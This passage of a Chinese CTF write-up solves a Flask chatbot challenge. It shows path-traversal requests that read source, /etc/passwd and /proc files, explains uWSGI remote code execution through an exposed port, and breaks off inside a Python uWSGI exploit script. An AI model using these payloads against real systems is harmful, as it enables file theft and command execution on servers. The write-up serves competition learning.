    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'{}.html'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/src'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        src <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    resp <span class="token operator">=</span> Response<span class="token punctuation">(</span>src<span class="token punctuation">)</span>
    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'content-type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain; charset=utf-8'</span>
    <span class="token keyword">return</span> resp

<span class="token comment">#app.run()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据源码，我们可以构造 payload 去读取任意文件。</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /module?log=../utils.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>utils.py</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">from</span> datetime <span class="token keyword">import</span> date
<span class="token keyword">from</span> pprint <span class="token keyword">import</span> pformat

<span class="token keyword">def</span> <span class="token function">get_today</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> date<span class="token punctuation">.</span>today<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y_%m_%d'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">var_dump</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> pformat<span class="token punctuation">(</span>var<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_default_server</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'127.0.0.1:1234'</span>

<span class="token keyword">def</span> <span class="token function">send_msg</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span> <span class="token operator">=</span> server_addr<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
        sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> r<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">write_chat_log</span><span class="token punctuation">(</span>send<span class="token punctuation">,</span> recv<span class="token punctuation">)</span><span class="token punctuation">:</span>
    logfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'media/chat_log_{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>get_today<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span>
    logfile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'you sent ---&gt;\n'</span><span class="token punctuation">,</span> send<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'server replied &lt;---\n'</span><span class="token punctuation">,</span> recv<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看出是通过 socket 把输入 base64 decode 一下，然后发包，再把结果返回给前端。</p>
<p>刚开始以为是 flask SSTI，于是读了读模板 <code>templates/chatbot.html</code></p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Chat Bot!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename=<span class="token punctuation">'</span>style.css<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>server<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Chatbot Address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>server<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>server<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{{ data.server_addr }}<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Chat window (base64 encoded)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>22<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>80<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>{{ data.content }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>response<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Chatbot response (base64 encoded)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>response<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>22<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>80<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>response<span class="token punctuation">"</span></span> <span class="token attr-name">readonly</span><span class="token punctuation">&gt;</span></span>{{ data.response }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/module?name=chatlog&amp;log=chat_log_{{ data.day }}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Click to view chat log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/src<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Open source<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然而试了老半天也没成功注入这个 <code>data.content</code> 或者 <code>data.response</code>。</p>
<p>还想了能不能构造个错误请求，在 url 里附带 <code>{{}}</code> 这种，然而发现后端用的 nginx 套 uwsgi，请求的 url 并不会出现在 response 中，遂作罢。</p>
<p>试了试是可以读到 <code>/etc/passwd</code> 之类的，于是想看看这个默认的 1234 端口对应啥程序，以及当前运行的有啥东西，也就是信息收集啦。</p>
<p>先读了读 <code>/proc/self/cmdline</code>，然后爆破了 <code>/proc/&lt;pid&gt;/cmdline</code>，再依次去读相应的配置文件。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211116030926208.png"></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211116030814810.png"></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211116030837884.png"></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211116030857310.png"></p>
<p><code>chatbot.py</code> 看起来没啥用，只是为了默认的 1234 端口的响应罢了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment">#coding:utf-8</span>

<span class="token keyword">import</span> socketserver
<span class="token keyword">import</span> base64<span class="token punctuation">,</span> random


<span class="token keyword">class</span> <span class="token class-name">ChatBotServer</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        conn <span class="token operator">=</span> self<span class="token punctuation">.</span>request
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"断开与%s的连接！"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>client_address<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">b"%s\n"</span> <span class="token operator">%</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">'Goodbye!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            r <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'Hello!'</span><span class="token punctuation">,</span> <span class="token string">b'Alola!'</span><span class="token punctuation">,</span> <span class="token string">b'Nice to meet you.'</span><span class="token punctuation">,</span> <span class="token string">b'What a wonderful game!'</span><span class="token punctuation">,</span> <span class="token string">b'Try again and harder!'</span><span class="token punctuation">,</span> <span class="token string">b'Good luck to you!'</span><span class="token punctuation">]</span>
            conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">b"%s\n"</span> <span class="token operator">%</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    server <span class="token operator">=</span> socketserver<span class="token punctuation">.</span>ThreadingTCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ChatBotServer<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"启动ChatBot！"</span><span class="token punctuation">)</span>
    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>确实没啥用</p>
<p><code>supervisor-ctf.conf</code></p>
<pre class="line-numbers language-conf" data-language="conf"><code class="language-conf">[supervisord]
logfile=/tmp/supervisord.log ; main log file; default $CWD/supervisord.log
logfile_maxbytes=50MB        ; max main logfile bytes b4 rotation; default 50MB
logfile_backups=0           ; # of main logfile backups; 0 means none, default 10
loglevel=info                ; log level; default info; others: debug,warn,trace
pidfile=/tmp/supervisord.pid ; supervisord pidfile; default supervisord.pid
nodaemon=true               ; start in foreground if true; default false
silent=false                 ; no logs to stdout if true; default false
minfds=1024                  ; min. avail startup file descriptors; default 1024
minprocs=200                 ; min. avail process descriptors;default 200

[program:uwsgi]
command=uwsgi --ini /tmp/uwsgi-ctf.ini
user=root
autorestart=true
autostart=true
startretries=3
redirect_stderr=true
startsecs=5
stdout_logfile=/tmp/supervisor.log
stopasgroup=true
killasgroup=true
priority=999

[program:chatbot]
command=python /usr/src/ufctf/chatbot.py
user=nobody
autorestart=true
autostart=true
startretries=3
redirect_stderr=true
startsecs=5
stdout_logfile=/tmp/supervisor.log
stopasgroup=true
killasgroup=true
priority=999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>uwsgi-ctf.ini</code></p>
<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token selector">[uwsgi]</span>
<span class="token constant">socket</span> <span class="token attr-value"><span class="token punctuation">=</span> :3031</span>
<span class="token constant">chdir</span> <span class="token attr-value"><span class="token punctuation">=</span> /usr/src/ufctf</span>
<span class="token constant">manage-script-name</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span>
<span class="token constant">mount</span> <span class="token attr-value"><span class="token punctuation">=</span> /=app:app</span>
<span class="token constant">master</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span>
<span class="token constant">uid</span> <span class="token attr-value"><span class="token punctuation">=</span> nobody</span>
<span class="token constant">gid</span> <span class="token attr-value"><span class="token punctuation">=</span> nogroup</span>
<span class="token constant">workers</span> <span class="token attr-value"><span class="token punctuation">=</span> 2</span>
<span class="token constant">buffer-size</span> <span class="token attr-value"><span class="token punctuation">=</span> 65535</span>
<span class="token constant">enable-threads</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span>
<span class="token constant">pidfile</span> <span class="token attr-value"><span class="token punctuation">=</span> /tmp/uwsgi.pid</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /module?log=../run.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">#!/bin/sh

cd /usr/src/ufctf

cp /flagtmp /flag
echo "" &gt; /flagtmp

chown nobody -R . \
    &amp;&amp; chmod 0666 -R /tmp/* \
    &amp;&amp; chown root:root /flag \
    &amp;&amp; chmod 0600 /flag

socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 &amp;

nginx -c /etc/nginx/nginx.conf
exec supervisord -n -c /etc/supervisor-ctf.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看出 uwsgi 绑定了 0.0.0.0:3031，而且 <strong>supervisor 里 uwsgi 是 root 用户跑的</strong>，但其 workers 是 nobody。</p>
<p>于是整了老半天就卡住了。</p>
<blockquote>
<p><strong>第二阶段提示</strong></p>
<p>把 uwsgi 端口暴露给别人是个危险的事情，<a target="_blank" rel="noopener" href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md">可以被用来干坏事</a>。 </p>
<p>正确的权限设置能阻止干坏事。错误的权限设置能用来干更多坏事。</p>
</blockquote>
<p>果然是 uWSGI 开了端口的锅。</p>
<p>其协议中有一个参数<code>UWSGI_FILE</code>，可以用来忽略原有uWSGI绑定 App，动态设定一个新的文件进行加载执行。这是一个LFI的漏洞，可以任意执行本地存在的任何文件，再结合 uWSGI 程序中默认注册的一系列 schemes，其中有<code>exec</code>协议。于是可以直接通过刚才的<code>UWSGI_FILE</code>变量传参，导致远程执行系统命令。</p>
<p>那就直接利用 <a target="_blank" rel="noopener" href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py">hint 里给的 exp</a> 来生成 payload 好了。</p>
<p>刚开始还是先生成一个执行命令，输出写入到临时文件的 payload，再手动在浏览器里执行，然后去读这个临时文件的结果。整了老半天发现还读不到 flag，很难受，于是最后心态崩了，干脆把交互过程一起写了吧。。。唉（</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
<span class="token keyword">import</span> time
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> requests


<span class="token keyword">def</span> <span class="token function">sz</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>x <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
    <span class="token comment"># if sys.version_info[0] == 3: import bytes</span>
    s <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token keyword">else</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">pack_uwsgi_vars</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token punctuation">:</span>
    pk <span class="token operator">=</span> <span class="token string">b''</span>
    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> var<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> <span class="token string">'items'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> var<span class="token punctuation">:</span>
        pk <span class="token operator">+=</span> sz<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> sz<span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">+</span> v<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> sz<span class="token punctuation">(</span>pk<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> pk
    <span class="token keyword">return</span> result


<span class="token keyword">def</span> <span class="token function">parse_addr</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> default_port<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    port <span class="token operator">=</span> default_port
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> addr<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            addr<span class="token punctuation">,</span> port <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> addr
        <span class="token keyword">elif</span> <span class="token string">':'</span> <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
            addr<span class="token punctuation">,</span> _<span class="token punctuation">,</span> port <span class="token operator">=</span> addr<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">,</span> <span class="token builtin">set</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr<span class="token punctuation">,</span> port <span class="token operator">=</span> addr
    port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span> <span class="token keyword">if</span> port <span class="token keyword">else</span> port
    <span class="token keyword">return</span> <span class="token punctuation">(</span>addr <span class="token keyword">or</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_host_from_url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'//'</span> <span class="token keyword">in</span> url<span class="token punctuation">:</span>
        url <span class="token operator">=</span> url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'//'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    host<span class="token punctuation">,</span> _<span class="token punctuation">,</span> url <span class="token operator">=</span> url<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> <span class="token string">'/'</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">fetch_data</span><span class="token punctuation">(</span>uri<span class="token punctuation">,</span> payload<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'http'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> uri<span class="token punctuation">:</span>
        uri <span class="token operator">=</span> <span class="token string">'http://'</span> <span class="token operator">+</span> uri
    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
